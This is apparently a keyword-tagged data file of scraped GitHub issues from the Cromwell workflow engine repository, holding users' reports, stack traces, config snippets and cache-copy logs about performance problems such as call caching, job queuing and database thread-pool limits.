scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.for",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2215:826,concurren,concurrent,826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2215,3,['concurren'],['concurrent']
Performance,"- cromwell 26; - call caching is on (local mysql); - server mode, but only running one workflow; - lots of subworkflows; - JES backend. This workflow has > 20k tasks. Most of the questions are in the title. I ran a lot of tasks and the workflow eventually failed with the same error as reported in issue #2215 . Therefore, I am not sure whether this is a side effect of the failure. This could also just be an issue with the timing diagram. Regardless, see attached image. . Suggestion (which you probably thought, already): Do not investigate until after #2215 is remedied. . Once I run with a fix for #2215 , I'll check to see if this is still an issue. . Is there a parameter that would let me increase the dispatch rate? Would that alleviate this issue?. ![queuedincromwellissue](https://cloud.githubusercontent.com/assets/2152339/25530922/f9208b78-2bf5-11e7-9553-5a7f69a79dc4.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2216:761,queue,queuedincromwellissue,761,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2216,1,['queue'],['queuedincromwellissue']
Performance,"- cromwell v27; - SGE backend; - server mode. Cromwell timing diagram displays SGE queued (qw) status as Running. This increases difficulty of debugging (or evaluating) a tool, since we do not have a reliable and easy(!) way to look at timing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2464:83,queue,queued,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2464,1,['queue'],['queued']
Performance,"- cromwell-27-c89c83f-SNAP; - server mode; - JES backend; - call caching on localhost mysql server. Is this a matter of hitting some sort of ceiling in number of concurrent jobs? Can I increase this?. ```; ....snip....; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Task slick.basic.BasicBackend$DatabaseDef$$anon$2@122f57e rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@35ca91f1[Running, pool size = 20, active threads = 20, queued tasks = 1000, completed tasks = 2293]""; }; ],; ""message"": ""JobStore write failure: Task slick.basic.BasicBackend$DatabaseDef$$anon$2@122f57e rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@35ca91f1[Running, pool size = 20, active threads = 20, queued tasks = 1000, completed tasks = 2293]""; }; ],; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2219:162,concurren,concurrent,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2219,3,"['concurren', 'queue']","['concurrent', 'queued']"
Performance,"- local backend + docker; - dev snapshot with two merged branches. _There are three issues confounding this run, so please only look at the HetPulldown runs (at the top)._. All jobs in this run should have been cache hits. However, it seems as if two of the HetPulldown jobs were marked as cache misses, though nothing had changed. ![all_should_be_cache_hits](https://cloud.githubusercontent.com/assets/2152339/18922404/7e258c6e-8576-11e6-976e-4b95860384ac.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1494:211,cache,cache,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1494,2,['cache'],['cache']
Performance,"- local backend with 16 cores and 104GB RAM; - cromwell-0.21-6da2d10-SNAPSHOT.jar (incl. file path hashing and local backend throttling). Whether the job is a cache hit or not, it seems that the cromwell final overhead takes 3-8 minutes, which is a long time. This happens even for jobs where the files generated (and input) are very small (and there are few files). We do not use `read_string` in the wdl. http://104.198.41.229:8080/api/workflows/v2/70a6e380-1dd7-473b-a852-4bd54b22ecdf/timing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488:159,cache,cache,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488,1,['cache'],['cache']
Performance,"- local backend. The slowness is probably driven by calculating a md5 hash on the bam input files. For jobs that do not have bam files as inputs, the cache determination is fast. Calculating a md5 on a bam file is too slow for use in call caching on a local backend. I can provide a time estimate, if necessary. Does SGE backend has the same issue?. Proposed solution:; - If md5 file is next to input file (e.g. sample1.bam is next to sample1.bam.md5) then read the md5 hash from the *.md5 file. Otherwise, use the file path. For bams, the file paths will tend to be static for most local backend environments anyway. ; - Make sure this convention is documented.; - Perhaps have a flag in the conf file so that users can choose which convention they prefer? IMHO, have the fast method (above) as the default.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1483:150,cache,cache,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1483,1,['cache'],['cache']
Performance,"- single workflow mode; - JES backend; - Google VM; - 0.23. ```; ....snip...; [2016-12-06 01:52:49,82] [warn] Unrecognized configuration key(s) for Jes: genomics-api-queries-per-100-seconds, dockerhub.token, dockerhub.account, genomics.compute-service-account; ....snip....; ```. As far as I can tell, I am using the same keys as in the reference conf file. Worked in previous dev builds with same structure (though fewer keys). @kcibul This is important, though I would not be surprised if this was user error. From the configuration:. ```; ...snip...; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; # Google project; project = ""broad-dsde-methods""; ; # Base bucket for workflow executions; root = ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/""; ; # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 1000; ; # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; ; # Optional Dockerhub Credentials. Can be used to access private docker images. REMOVED HERE; dockerhub {; account = ""user_manually_removed""; token = ""password_manually_removed""; }; ; genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default""; ; // alternative service account to use on the launched compute instance; // NOTE: If combined with servi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748:981,throughput,throughput,981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748,1,['throughput'],['throughput']
Performance,- throttling was on; - call cache hashing was done with file paths,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978:28,cache,cache,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978,1,['cache'],['cache']
Performance,"---. > All hoped-for things will come to you; > Who have the strength to watch and wait,; > Our longings spur the steeds of Fate,; > This has been said by one who knew. ---. - Don't set defaults for CI build variables ; - Removed many unused CI build variables ; - Renamed CI build variables based on generation and/or usage; - Ensure only passed values for CI build variables are used ; - Fixed tests that were using defaults and not passing in variables ; - Render centaur refresh tokens instead of rewriting json in memory ; - Don't use a bash wrapper-process for launching docker-compose from centaur ; - Pass centaur CI variables to docker-compose using env directly ; - Print docker-compose logs when centaur is unable to run `docker-compose up` ; - Better local docker-compose CI debugging with `crmdmm=y testFoo.sh` ; - Fix local CI debugging that was looking for `[force ci]` on prior commit ; - Allow force pushes to GitHub to use `[force ci]` syntax ; - Left `conformanceTesk` references while stubbing unused test ; - Consolidate tag generation for various docker images ; - Consolidate sbt invocation to build various docker images ; - On local tests, cache docker images just like assembly jars ; - Consistent level of verbosity on CI docker pushes and pulls ; - Moved conformance CI env-based-customization out of the reference.conf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5738:1165,cache,cache,1165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5738,1,['cache'],['cache']
Performance,"-02-22 23:09:17 UTC] PRELOAD: false\n[INFO 2021-02-22 23:09:17 UTC] Running on COS build id 13310.1209.10\n[INFO 2021-02-22 23:09:17 UTC] Data dependencies (e.g. kernel source) will be fetched from https://storage.googleapis.com/cos-tools/13310.1209.10\n[INFO 2021-02-22 23:09:17 UTC] Getting the kernel source repository path.\n[INFO 2021-02-22 23:09:17 UTC] Obtaining kernel_info file from https://storage.googleapis.com/cos-tools/13310.1209.10/kernel_info\n[INFO 2021-02-22 23:09:19 UTC] Downloading kernel_info file from https://storage.googleapis.com/cos-tools/13310.1209.10/kernel_info\n\nreal\t0m0.072s\nuser\t0m0.013s\nsys\t0m0.006s\n[INFO 2021-02-22 23:09:19 UTC] Checking if this is the only cos-gpu-installer that is running.\n[INFO 2021-02-22 23:09:19 UTC] Checking if third party kernel modules can be installed\n[INFO 2021-02-22 23:09:19 UTC] Checking cached version\n[INFO 2021-02-22 23:09:19 UTC] Cache file /usr/local/nvidia/.cache not found.\n[INFO 2021-02-22 23:09:19 UTC] Did not find cached version, building the drivers...\n[INFO 2021-02-22 23:09:19 UTC] Downloading GPU installer ... \n[INFO 2021-02-22 23:09:19 UTC] Downloading from https://storage.googleapis.com/nvidia-drivers-us-public/nvidia-cos-project/85/tesla/450_00/450.51.06/NVIDIA-Linux-x86_64-450.51.06_85-13310-1209-10.cos\n[INFO 2021-02-22 23:09:19 UTC] Downloading GPU installer from https://storage.googleapis.com/nvidia-drivers-us-public/nvidia-cos-project/85/tesla/450_00/450.51.06/NVIDIA-Linux-x86_64-450.51.06_85-13310-1209-10.cos\n\nreal\t0m1.891s\nuser\t0m0.181s\nsys\t0m0.449s\n[INFO 2021-02-22 23:09:21 UTC] Setting up compilation environment\n[INFO 2021-02-22 23:09:21 UTC] Obtaining toolchain_env file from https://storage.googleapis.com/cos-tools/13310.1209.10/toolchain_env\n[INFO 2021-02-22 23:09:21 UTC] Downloading toolchain_env file from https://storage.googleapis.com/cos-tools/13310.1209.10/toolchain_env\n\nreal\t0m0.042s\nuser\t0m0.014s\nsys\t0m0.003s\n[INFO 2021-02-22 23:09:21 UTC] Found to",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6195:3886,cache,cached,3886,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6195,1,['cache'],['cached']
Performance,"-11-10 13:45:54,44] [info] BackgroundConfigAsyncJobExecutionActor [5c89d3e8PairedEndSingleSampleWorkflow.BaseRecalibrator:14:1]: job id: 95962; [2022-11-10 13:45:54,44] [info] BackgroundConfigAsyncJobExecutionActor [5c89d3e8PairedEndSingleSampleWorkflow.BaseRecalibrator:1:1]: job id: 96075; [2022-11-10 13:45:54,44] [info] BackgroundConfigAsyncJobExecutionActor [5c89d3e8PairedEndSingleSampleWorkflow.BaseRecalibrator:16:1]: job id: 96073; [2022-11-10 13:45:54,44] [info] BackgroundConfigAsyncJobExecutionActor [5c89d3e8PairedEndSingleSampleWorkflow.BaseRecalibrator:8:1]: job id: 95871; [2022-11-10 13:45:54,45] [error] KvWriteActor Failed to properly process data; cromwell.core.CromwellFatalException: java.sql.SQLDataException: data exception: string data, right truncation; table: JOB_KEY_VALUE_ENTRY column: STORE_VALUE; at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:55); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:46); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:490); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.sql.SQLDataException: data exception: string data, right truncation; table: JOB_KEY_VALUE_ENTRY column: STORE_VALUE; at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source); at com.zaxxer.hikari.pool.ProxyPreparedStatement.executeUpdate(ProxyP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6947:1423,concurren,concurrent,1423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6947,1,['concurren'],['concurrent']
Performance,"-12-15 21:22:59,16] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.sex_aneuploidy:-1:1-20000000003 [9e4f5894main.sex_aneuploidy:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,17] [info] BT-322 9e4f5894:main.sex_aneuploidy:-1:1 cache hit copying success with aggregated hashes: initial = 86896541F0DCB2C2B959EEF37F266B30, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,17] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.sex_aneuploidy:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,32] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.month_of_birth:-1:1-20000000024 [9e4f5894main.month_of_birth:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:22:59,32] [info] BT-322 9e4f5894:main.month_of_birth:-1:1 cache hit copying success with aggregated hashes: initial = 601F8C709AA96517AA171B340CCA88BF, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:22:59,32] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.month_of_birth:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.kinship_count' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.reported_sex' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.sex_aneuploidy' (scatter index: None, attempt 1); [2022-12-15 21:22:59,78] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:23524,cache,cache,23524,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] SubWorkflowStoreActor stopped; [2018-11-21 15:09:44,63] [info] JobStoreActor stopped; [2018-11-21 15:09:44,63] [info] DockerHashActor stopped; [2018-11-21 15:09:44,63] [info] IoProxy stopped; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] CallCacheWriteActor stopped; [2018-11-21 15:09:44,63] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-11-21 15:09:44,63] [info] ServiceRegistryActor stopped; [2018-11-21 15:09:44,65] [info] Database closed; [2018-11-21 15:09:44,65] [info] Stream materializer shut down; [2018-11-21 15:09:44,66] [info] WDL HTTP import resolver closed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:6295,queue,queued,6295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,3,['queue'],['queued']
Performance,"-32 INFO - WorkflowManagerActor Starting workflow UUID(948bf608-f91b-46a7-b892-86454be067fd); 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowManagerActor Successfully started WorkflowActor-948bf608-f91b-46a7-b892-86454be067fd; 2018-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workfl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:1812,concurren,concurrent,1812,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz; 1608597138537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi; 1608597141037,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz; 1608597144746,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:55568,cache,cacheCopy,55568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz; 1608597486185,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz.tbi; 1608597487788,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi; 1608597489587,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:151550,cache,cacheCopy,151550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz; 1608597301211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz.tbi; 1608597303071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi; 1608597306259,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:99177,cache,cacheCopy,99177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz; 1608597133659,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-109/cacheCopy/SR00c.NA18499.txt.gz.tbi; 1608597136464,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-14/cacheCopy/SR00c.HG00557.txt.gz to 